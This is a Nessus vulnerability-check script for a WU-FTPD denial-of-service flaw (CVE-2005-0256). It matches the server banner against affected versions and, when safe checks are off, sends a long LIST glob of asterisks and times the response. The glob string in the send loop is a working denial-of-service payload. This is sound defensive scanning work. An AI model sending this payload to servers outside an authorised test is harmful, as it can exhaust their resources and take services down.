#
# This script was written by Michel Arboi <mikhail@nessus.org>
# GPL....
#
# References:
# http://www.idefense.com/application/poi/display?id=207&type=vulnerabilities
#
if (description)
{
 	script_id(17602);
	script_cve_id("CVE-2005-0256");
  	script_version("$Revision: 1.6 $");
 	name["english"] = "FTPD glob (too many *) denial of service";
	script_name(english: name["english"]);

 	desc["english"] = "
WU-FTPD exhausts all available resources on the server
when it receives several times
LIST *****[...]*.*

Solution : Contact your vendor for a fix
Risk factor : High";

 	script_description(english: desc["english"]);
 	script_summary(english: 'Sends "LIST *****[...]*.*" to the FTP server');

 	script_category(ACT_DENIAL);
 	script_family(english: "FTP");

 	script_copyright(english: "Copyright (C) 2005 Michel Arboi");
 	script_dependencie("find_service.nes", "ftp_anonymous.nasl");
 	script_require_ports("Services/ftp", 21);
 	exit(0);
}


include('global_settings.inc');
include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if (! port) port = 21;
if (! get_port_state(port)) exit(0);

banner = get_ftp_banner(port: port);

if (safe_checks())
{
 if (egrep(string:banner, pattern:" FTP .*Version wu-2\.6\.(1|2|2\(1\)) ")) security_hole(port);
 exit(0);
}

# Uncomment next line if there are too many false positive
# if (report_paranoia <= 0 && banner && "wu" >!< banner) exit(0);

if (!banner || ("Version wu-" >!< banner)) exit (0);

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

if (! login) login = "anonymous";
if (! password) password = "nessus@example.com";

for (i = 0; i < 2; i ++)
{
 soc = open_sock_tcp(port);
 if (! soc ||
     ! ftp_authenticate(socket:soc, user:login, pass:password))
  exit(0);
 pasv = ftp_pasv(socket: soc);
 soc2 = open_sock_tcp(pasv);
 # Above 194 *, the server answers "sorry input line too long"
 if (i)
 send(socket: soc, data: 'LIST ***********************************************************************************************************************************************************************************************.*\r\n');
 else
 send(socket: soc, data: 'LIST *.*\r\n');
 t1 = unixtime();
 b = ftp_recv_line(socket:soc);
 repeat
  data = recv(socket: soc2, length: 1024);
 until (! data);
 t[i] = unixtime() - t1;
 #b = ftp_recv_line(socket:soc);
 close(soc); soc = NULL;
 close(soc2);
}

if (t[0] == 0) t[0] = 1;
if (t[1] > 3 * t[0]) security_hole(port);
